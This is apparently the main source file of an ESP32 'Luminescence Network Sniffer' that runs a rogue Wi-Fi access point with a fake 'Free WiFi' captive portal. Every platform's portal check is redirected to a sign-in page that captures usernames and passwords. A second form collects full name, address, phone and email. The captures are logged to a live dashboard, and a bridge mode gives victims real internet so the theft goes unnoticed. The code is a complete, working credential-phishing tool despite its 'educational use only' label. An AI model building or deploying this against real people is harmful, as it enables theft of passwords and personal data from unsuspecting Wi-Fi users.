// ============================================
//  Luminescence Network Sniffer — Phase 5
//  Rogue AP + Captive Portal + Live Dashboard
//  + WiFi Bridge Mode (AP+STA+NAPT)
//
//  Author:  Bangkit Eldhianpranata (0xnhsec)
//  Board:   ESP32 DevKit V1
//  License: GPL-3.0 — Educational use only
//
//  Phase 5 additions:
//    - WIFI_AP_STA dual mode
//    - NAPT (NAT) via lwIP — AP clients get real internet
//    - Bridge status in /api/poll + /api/bridge
//    - STA auto-reconnect (every STA_RETRY_MS)
//
//  Phase 4:
//    - In-memory event ring buffer (last 50 events)
//    - Live dashboard at http://192.168.4.1/dashboard
//    - Merged JSON API: /api/poll?since=<id>
//    - Legacy: /api/events, /api/stats
//
//  Dependencies: NONE (all built-in ESP32 core)
//  Requires ESP32 Arduino Core >= 3.x (IDF 5) for NAPT
// ============================================

#include <WiFi.h>
#include <WebServer.h>
#include <SPIFFS.h>
#include "dns_proxy.h"

// NAPT is provided by WiFiAP.h (WiFi 3.3.8): WiFi.enableNAPT(bool)

#include "config.h"
#include "event_buffer.h"
#include "logger.h"

// --- Server Instance ---
WebServer server(HTTP_PORT);

// --- Track connected clients ---
int clientCount = 0;

// --- SPIFFS available flag ---
bool spiffsReady = false;

// --- Bridge / STA state (Phase 5) ---
#if BRIDGE_MODE
  bool staConnected = false;
  bool bridgeActive = false;
  unsigned long lastSTARetry = 0;
#endif

// ============================================
//  SPIFFS Setup
// ============================================
void setupSPIFFS() {
  if (SPIFFS.begin(true)) {
    spiffsReady = true;
    Logger::info("SPIFFS mounted");

    File root = SPIFFS.open("/");
    File file = root.openNextFile();
    while (file) {
      Serial.printf("  📄 %s (%d bytes)\n", file.name(), file.size());
      file = root.openNextFile();
    }
    Logger::separator();
  } else {
    Logger::warn("SPIFFS mount failed — using inline HTML fallback");
  }
}

// ============================================
//  Serve file from SPIFFS or fallback
// ============================================
void servePage(const char* path, const char* fallbackHtml) {
  if (spiffsReady && SPIFFS.exists(path)) {
    File f = SPIFFS.open(path, "r");
    server.streamFile(f, "text/html");
    f.close();
  } else {
    server.send(200, "text/html", fallbackHtml);
  }
}

// ============================================
//  Fallback inline HTML (if SPIFFS empty)
// ============================================
const char FALLBACK_LOGIN[] PROGMEM = R"(<!DOCTYPE html><html><body style="background:#0a0a0a;color:#fff;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh"><div style="max-width:350px;padding:30px"><h2>Free WiFi</h2><form action="/login" method="POST"><input name="username" placeholder="Username" style="width:100%;padding:10px;margin:8px 0;background:#222;border:1px solid #444;color:#fff;border-radius:6px"><input name="password" type="password" placeholder="Password" style="width:100%;padding:10px;margin:8px 0;background:#222;border:1px solid #444;color:#fff;border-radius:6px"><button style="width:100%;padding:10px;background:#4a9eff;border:none;color:#fff;border-radius:6px;cursor:pointer">Sign In</button></form></div></body></html>)";

const char FALLBACK_BIODATA[] PROGMEM = R"(<!DOCTYPE html><html><body style="background:#0a0a0a;color:#fff;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh"><div style="max-width:350px;padding:30px"><h2>Complete Profile</h2><form action="/biodata" method="POST"><input name="nama" placeholder="Full Name" style="width:100%;padding:10px;margin:8px 0;background:#222;border:1px solid #444;color:#fff;border-radius:6px"><input name="alamat" placeholder="Address" style="width:100%;padding:10px;margin:8px 0;background:#222;border:1px solid #444;color:#fff;border-radius:6px"><input name="telepon" placeholder="Phone" style="width:100%;padding:10px;margin:8px 0;background:#222;border:1px solid #444;color:#fff;border-radius:6px"><input name="email" placeholder="Email" style="width:100%;padding:10px;margin:8px 0;background:#222;border:1px solid #444;color:#fff;border-radius:6px"><button style="width:100%;padding:10px;background:#4a9eff;border:none;color:#fff;border-radius:6px;cursor:pointer">Continue</button></form></div></body></html>)";

const char FALLBACK_SUCCESS[] PROGMEM = R"(<!DOCTYPE html><html><body style="background:#0a0a0a;color:#6fcf6f;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;text-align:center"><div><h1 style="font-size:48px">&#10003;</h1><h2>Connected!</h2><p style="color:#888">You are now online</p></div></body></html>)";

// ============================================
//  Bridge Mode — NAPT helpers (Phase 5)
// ============================================
#if BRIDGE_MODE
void enableNAPT() {
  WiFi.AP.enableNAPT(true);   // APClass in WiFiAP.h — ESP32 Core 3.x
  bridgeActive = true;
  Logger::bridgeUp(String(STA_SSID), WiFi.localIP().toString());
}

void disableNAPT() {
  WiFi.AP.enableNAPT(false);
  bridgeActive = false;
  Logger::bridgeDown("STA disconnected");
}
#endif

// ============================================
//  WiFi AP Setup
// ============================================
void setupAP() {
#if BRIDGE_MODE
  WiFi.mode(WIFI_AP_STA);
#else
  WiFi.mode(WIFI_AP);
#endif

  WiFi.softAPConfig(AP_LOCAL_IP, AP_GATEWAY, AP_SUBNET);
  WiFi.softAP(AP_SSID, AP_PASS, AP_CHANNEL, false, AP_MAX_CONN);

  Logger::info("Access Point started");
  Logger::info("SSID:     " + String(AP_SSID));
  Logger::info("Password: " + String(AP_PASS));
  Logger::info("IP:       " + WiFi.softAPIP().toString());
  Logger::info("Channel:  " + String(AP_CHANNEL));
  Logger::separator();
}

// ============================================
//  Bridge Mode — STA Setup (Phase 5)
// ============================================
#if BRIDGE_MODE
void setupSTA() {
  Logger::info("Bridge Mode: connecting to upstream...");
  Logger::info("Upstream SSID: " + String(STA_SSID));
  WiFi.begin(STA_SSID, STA_PASS);
}
#endif

// ============================================
//  WiFi Event Handler
// ============================================
void onWiFiEvent(WiFiEvent_t event, WiFiEventInfo_t info) {
  switch (event) {
    // --- AP client events ---
    case ARDUINO_EVENT_WIFI_AP_STACONNECTED: {
      clientCount++;
      char mac[18];
      snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
               info.wifi_ap_staconnected.mac[0],
               info.wifi_ap_staconnected.mac[1],
               info.wifi_ap_staconnected.mac[2],
               info.wifi_ap_staconnected.mac[3],
               info.wifi_ap_staconnected.mac[4],
               info.wifi_ap_staconnected.mac[5]);
      Logger::doubleSeparator();
      Serial.printf("[*] Client CONNECTED: %s (%d total)\n", mac, clientCount);
      Logger::clientConnected(String(mac));
      break;
    }
    case ARDUINO_EVENT_WIFI_AP_STADISCONNECTED: {
      clientCount--;
      if (clientCount < 0) clientCount = 0;
      char mac[18];
      snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
               info.wifi_ap_stadisconnected.mac[0],
               info.wifi_ap_stadisconnected.mac[1],
               info.wifi_ap_stadisconnected.mac[2],
               info.wifi_ap_stadisconnected.mac[3],
               info.wifi_ap_stadisconnected.mac[4],
               info.wifi_ap_stadisconnected.mac[5]);
      Serial.printf("[*] Client DISCONNECTED: %s (%d total)\n", mac, clientCount);
      Logger::clientDisconnected(String(mac));
      break;
    }

#if BRIDGE_MODE
    // --- STA upstream events (Phase 5) ---
    case ARDUINO_EVENT_WIFI_STA_GOT_IP:
      staConnected = true;
      enableNAPT();
      break;

    case ARDUINO_EVENT_WIFI_STA_DISCONNECTED:
      if (staConnected) {
        staConnected = false;
        disableNAPT();
        lastSTARetry = millis();
        Logger::warn("Upstream lost — will retry in " +
                     String(STA_RETRY_MS / 1000) + "s");
      }
      break;
#endif

    default:
      break;
  }
}

// ============================================
//  Log all tracked headers
// ============================================
void logHeaders() {
  for (int i = 0; i < NUM_HEADERS; i++) {
    if (server.hasHeader(TRACKED_HEADERS[i])) {
      String val = server.header(TRACKED_HEADERS[i]);
      if (val.length() > 0 && String(TRACKED_HEADERS[i]) != "User-Agent") {
        Logger::header(TRACKED_HEADERS[i], val);
      }
    }
  }
}

// ============================================
//  HTTP Route Handlers
// ============================================

void handleRoot() {
  Logger::httpRequest(
    "GET", "/",
    server.client().remoteIP().toString(),
    server.hasHeader("User-Agent") ? server.header("User-Agent") : ""
  );
  logHeaders();
  servePage("/login.html", FALLBACK_LOGIN);
}

void handleCSS() {
  if (spiffsReady && SPIFFS.exists("/style.css")) {
    File f = SPIFFS.open("/style.css", "r");
    server.streamFile(f, "text/css");
    f.close();
  } else {
    server.send(404, "text/plain", "");
  }
}

void handleLogin() {
  String clientIP = server.client().remoteIP().toString();
  String ua = server.hasHeader("User-Agent") ? server.header("User-Agent") : "";

  String username = server.hasArg("username") ? server.arg("username") : "(empty)";
  String password = server.hasArg("password") ? server.arg("password") : "(empty)";

  Logger::httpRequest("POST", "/login", clientIP, ua);
  logHeaders();

  String rawBody = "username=" + username + "&password=" + password;
  Logger::postBody(rawBody);
  Logger::credentials(username, password, clientIP);

  servePage("/biodata.html", FALLBACK_BIODATA);
}

void handleBiodata() {
  String clientIP = server.client().remoteIP().toString();
  String ua = server.hasHeader("User-Agent") ? server.header("User-Agent") : "";

  String nama    = server.hasArg("nama")    ? server.arg("nama")    : "(empty)";
  String alamat  = server.hasArg("alamat")  ? server.arg("alamat")  : "(empty)";
  String telepon = server.hasArg("telepon") ? server.arg("telepon") : "(empty)";
  String email   = server.hasArg("email")   ? server.arg("email")   : "(empty)";

  Logger::httpRequest("POST", "/biodata", clientIP, ua);
  logHeaders();

  String rawBody = "nama=" + nama + "&alamat=" + alamat
                   + "&telepon=" + telepon + "&email=" + email;
  Logger::postBody(rawBody);
  Logger::biodata(nama, alamat, telepon, email, clientIP);

  servePage("/success.html", FALLBACK_SUCCESS);
}

// ============================================
//  Dashboard (Phase 4)
// ============================================
const char FALLBACK_DASHBOARD[] PROGMEM =
R"(<!DOCTYPE html><html><body style="background:#0a0a0a;color:#fff;font-family:sans-serif;padding:20px"><h2>Dashboard fallback</h2><p>Upload SPIFFS (data/dashboard.html) for the full UI.</p><pre id="o" style="background:#111;padding:12px;border-radius:6px;max-height:70vh;overflow:auto"></pre><script>var since=0;setInterval(function(){fetch('/api/poll?since='+since).then(function(r){return r.json()}).then(function(d){(d.events||[]).forEach(function(e){since=Math.max(since,e.id);document.getElementById('o').textContent=JSON.stringify(e)+'\n'+document.getElementById('o').textContent})})},1000);</script></body></html>)";

void handleDashboard() {
  if (spiffsReady && SPIFFS.exists("/dashboard.html")) {
    File f = SPIFFS.open("/dashboard.html", "r");
    server.streamFile(f, "text/html");
    f.close();
  } else {
    server.send_P(200, "text/html", FALLBACK_DASHBOARD);
  }
}

// ============================================
//  JSON API helpers
// ============================================
String buildStatsJson() {
  String json = "{";
  json += "\"uptime\":\"" + Logger::uptime() + "\"";
  json += ",\"clients\":" + String(clientCount);
  json += ",\"requests\":" + String(Logger::totalRequests);
  json += ",\"get\":" + String(Logger::totalGET);
  json += ",\"post\":" + String(Logger::totalPOST);
  json += ",\"creds\":" + String(Logger::credsCaptured);
  json += ",\"biodata\":" + String(Logger::biodataCaptured);
  json += ",\"lastId\":" + String(EventBuffer::lastId());
#if BRIDGE_MODE
  json += ",\"bridge\":" + String(bridgeActive ? "true" : "false");
  json += ",\"sta_ssid\":";
  json += EventBuffer::jsonStr(String(STA_SSID));
  json += ",\"sta_ip\":";
  json += EventBuffer::jsonStr(staConnected ? WiFi.localIP().toString() : String(""));
#else
  json += ",\"bridge\":false,\"sta_ssid\":\"\",\"sta_ip\":\"\"";
#endif
  json += "}";
  return json;
}

// GET /api/poll?since=<id>  — merged stats + events (used by dashboard)
void handleApiPoll() {
  unsigned long since = 0;
  if (server.hasArg("since")) {
    since = strtoul(server.arg("since").c_str(), nullptr, 10);
  }
  String json = "{\"stats\":";
  json += buildStatsJson();
  json += ",\"events\":";
  json += EventBuffer::toJSON(since);
  json += "}";
  server.sendHeader("Cache-Control", "no-store");
  server.send(200, "application/json", json);
}

// GET /api/stats  — stats only (legacy / curl debugging)
void handleApiStats() {
  server.sendHeader("Cache-Control", "no-store");
  server.send(200, "application/json", buildStatsJson());
}

// GET /api/events?since=<id>  — events only (legacy)
void handleApiEvents() {
  unsigned long since = 0;
  if (server.hasArg("since")) {
    since = strtoul(server.arg("since").c_str(), nullptr, 10);
  }
  server.sendHeader("Cache-Control", "no-store");
  server.send(200, "application/json", EventBuffer::toJSON(since));
}

// GET /api/bridge  — bridge status snapshot (Phase 5)
void handleApiBridge() {
  String json = "{";
#if BRIDGE_MODE
  json += "\"enabled\":true";
  json += ",\"active\":" + String(bridgeActive ? "true" : "false");
  json += ",\"ssid\":";
  json += EventBuffer::jsonStr(String(STA_SSID));
  json += ",\"sta_ip\":";
  json += EventBuffer::jsonStr(staConnected ? WiFi.localIP().toString() : String(""));
  json += ",\"ap_ip\":";
  json += EventBuffer::jsonStr(WiFi.softAPIP().toString());
#else
  json += "\"enabled\":false,\"active\":false,\"ssid\":\"\",\"sta_ip\":\"\",\"ap_ip\":\"\"";
#endif
  json += "}";
  server.sendHeader("Cache-Control", "no-store");
  server.send(200, "application/json", json);
}

// ============================================
//  Captive Portal Detection Handlers
// ============================================
void handleGenerate204() {
  Logger::httpRequest(
    "GET", "/generate_204 [Android Portal Check]",
    server.client().remoteIP().toString(),
    server.hasHeader("User-Agent") ? server.header("User-Agent") : ""
  );
  server.sendHeader("Location", "http://192.168.4.1/", true);
  server.send(302, "text/plain", "");
}

void handleHotspotDetect() {
  Logger::httpRequest(
    "GET", "/hotspot-detect.html [iOS Portal Check]",
    server.client().remoteIP().toString(),
    server.hasHeader("User-Agent") ? server.header("User-Agent") : ""
  );
  server.sendHeader("Location", "http://192.168.4.1/", true);
  server.send(302, "text/plain", "");
}

void handleConnectTest() {
  Logger::httpRequest(
    "GET", "/connecttest.txt [Windows Portal Check]",
    server.client().remoteIP().toString(),
    server.hasHeader("User-Agent") ? server.header("User-Agent") : ""
  );
  server.sendHeader("Location", "http://192.168.4.1/", true);
  server.send(302, "text/plain", "");
}

void handleNCSI() {
  server.sendHeader("Location", "http://192.168.4.1/", true);
  server.send(302, "text/plain", "");
}

void handleFirefoxDetect() {
  Logger::httpRequest(
    "GET", "/canonical.html [Firefox Portal Check]",
    server.client().remoteIP().toString(),
    server.hasHeader("User-Agent") ? server.header("User-Agent") : ""
  );
  server.sendHeader("Location", "http://192.168.4.1/", true);
  server.send(302, "text/plain", "");
}

void handleNotFound() {
  String uri = server.uri();

  if (uri == "/favicon.ico") {
    server.send(204, "", "");
    return;
  }

  Logger::httpRequest(
    (server.method() == HTTP_GET) ? "GET" : "POST",
    uri,
    server.client().remoteIP().toString(),
    server.hasHeader("User-Agent") ? server.header("User-Agent") : ""
  );
  server.sendHeader("Location", "http://192.168.4.1/", true);
  server.send(302, "text/plain", "Redirecting...");
}

// ============================================
//  Setup Routes
// ============================================
void setupRoutes() {
  // --- Main pages ---
  server.on("/", HTTP_GET, handleRoot);
  server.on("/login", HTTP_GET, handleRoot);
  server.on("/login", HTTP_POST, handleLogin);
  server.on("/biodata", HTTP_POST, handleBiodata);
  server.on("/style.css", HTTP_GET, handleCSS);

  // --- Live Dashboard (Phase 4 + 5) ---
  server.on("/dashboard",   HTTP_GET, handleDashboard);
  server.on("/api/poll",    HTTP_GET, handleApiPoll);
  server.on("/api/events",  HTTP_GET, handleApiEvents);
  server.on("/api/stats",   HTTP_GET, handleApiStats);
  server.on("/api/bridge",  HTTP_GET, handleApiBridge);  // Phase 5

  // --- Captive Portal Detection ---
  server.on("/generate_204",         HTTP_GET, handleGenerate204);
  server.on("/gen_204",              HTTP_GET, handleGenerate204);
  server.on("/hotspot-detect.html",  HTTP_GET, handleHotspotDetect);
  server.on("/connecttest.txt",      HTTP_GET, handleConnectTest);
  server.on("/ncsi.txt",             HTTP_GET, handleNCSI);
  server.on("/redirect",             HTTP_GET, handleNotFound);
  server.on("/canonical.html",       HTTP_GET, handleFirefoxDetect);
  server.on("/success.txt",          HTTP_GET, handleNotFound);

  const char* headerKeys[NUM_HEADERS];
  for (int i = 0; i < NUM_HEADERS; i++) {
    headerKeys[i] = TRACKED_HEADERS[i];
  }
  server.collectHeaders(headerKeys, NUM_HEADERS);

  server.onNotFound(handleNotFound);
}

// ============================================
//  Arduino Setup
// ============================================
void setup() {
  Serial.begin(SERIAL_BAUD);
  delay(1000);

  Logger::banner();

  setupSPIFFS();

  WiFi.onEvent(onWiFiEvent);

  // Start AP (and set mode to AP_STA if BRIDGE_MODE)
  setupAP();

  // Start DNS proxy
  // Bridge DOWN: all domains → 192.168.4.1 (captive portal)
  // Bridge UP:   portal probes → 192.168.4.1, others → 8.8.8.8 (real internet)
  DNSProxy::begin((uint32_t)AP_LOCAL_IP);
  Logger::info("DNS proxy started (portal-aware, :53 + fwd :5354)");

  setupRoutes();
  server.begin();

  Logger::info("HTTP server started on port " + String(HTTP_PORT));
  Logger::info("Captive portal: ACTIVE");
  Logger::info("SPIFFS pages: " + String(spiffsReady ? "YES" : "NO (fallback)"));
  Logger::info("Dashboard:    http://" + AP_LOCAL_IP.toString() + "/dashboard");

#if BRIDGE_MODE
  setupSTA();
  Logger::info("Bridge Mode: ENABLED (STA connecting...)");
#else
  Logger::info("Bridge Mode: DISABLED (AP-only)");
#endif

  Logger::info("Waiting for clients...");
  Logger::doubleSeparator();
  Serial.println();
}

// ============================================
//  Arduino Loop
// ============================================
void loop() {
#if BRIDGE_MODE
  DNSProxy::processNext(bridgeActive);
#else
  DNSProxy::processNext(false);
#endif
  server.handleClient();

#if BRIDGE_MODE
  // Retry upstream STA connection if lost
  if (!staConnected) {
    unsigned long now = millis();
    if (now - lastSTARetry >= STA_RETRY_MS) {
      lastSTARetry = now;
      Logger::info("Retrying upstream WiFi...");
      WiFi.disconnect(false);
      WiFi.begin(STA_SSID, STA_PASS);
    }
  }
#endif

  delay(2);
}
